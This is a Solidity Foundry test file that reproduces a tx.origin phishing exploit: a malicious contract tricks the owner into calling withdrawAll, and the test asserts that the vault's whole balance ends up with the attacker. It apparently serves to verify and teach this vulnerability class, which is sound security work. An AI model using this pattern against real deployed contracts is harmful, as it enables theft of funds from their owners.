// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/phishable.sol";

contract PhishableTest is Test {
    Phishable phishable;
    address payable owner = payable(makeAddr("owner"));
    address payable attacker = payable(makeAddr("attacker"));
    uint256 initialBalance = 1 ether;

    function setUp() public {
        // Deploy vulnerable contract with owner
        vm.prank(owner);
        phishable = new Phishable(owner);

        // Fund the contract with initial balance
        vm.deal(address(phishable), initialBalance);
    }

    function testTxOriginVulnerability() public {
        // Create malicious contract as the attacker
        vm.startPrank(attacker);
        MaliciousContract malicious = new MaliciousContract(address(phishable));
        vm.stopPrank();
        
        // --- BEFORE-Trigger (Attack) ---
        uint256 contractBalanceBefore = address(phishable).balance;
        uint256 totalWithdrawalsBefore = phishable.totalWithdrawals();
        console.log("Contract balance BEFORE attack:", contractBalanceBefore);
        console.log("Total withdrawals BEFORE attack:", totalWithdrawalsBefore);
        console.log("---");
        
        // --- Trigger Attack ---
        console.log("Triggering attack: malicious.trickOwner(attacker)");
        // Simulate owner calling malicious contract with proper tx.origin
        vm.startPrank(owner, owner);  // Sets both tx.origin and msg.sender
        malicious.trickOwner(attacker);
        vm.stopPrank();
        
        // --- AFTER-Trigger (Attack) ---
        uint256 contractBalanceAfter = address(phishable).balance;
        uint256 totalWithdrawalsAfter = phishable.totalWithdrawals();
        console.log("Contract balance AFTER attack:", contractBalanceAfter);
        console.log("Total withdrawals AFTER attack:", totalWithdrawalsAfter);
        
        // Differential comparison
        uint256 balanceDecrease = contractBalanceBefore - contractBalanceAfter;
        uint256 withdrawalsIncrease = totalWithdrawalsAfter - totalWithdrawalsBefore;
        bool fundsDrained = (balanceDecrease == initialBalance);
        bool withdrawalsIncreased = (withdrawalsIncrease == initialBalance);
        bool vulnerabilityVerified = fundsDrained && withdrawalsIncreased;
        
        // Final verdict
        if (vulnerabilityVerified) {
            console.log("Vulnerability Exists: Contract balance drained and withdrawals increased by initial balance");
        } else {
            console.log("Vulnerability not Exist: Contract state changes don't indicate successful attack");
        }

        // Existing validation assertions
        assertEq(address(phishable).balance, 0, "Contract balance not drained");
        assertEq(attacker.balance, initialBalance, "Attacker didn't receive funds");
    }
}

contract MaliciousContract {
    Phishable public phishable;

    constructor(address _phishable) {
        phishable = Phishable(payable(_phishable));
    }

    function trickOwner(address _attacker) public {
        phishable.withdrawAll(_attacker);
    }
}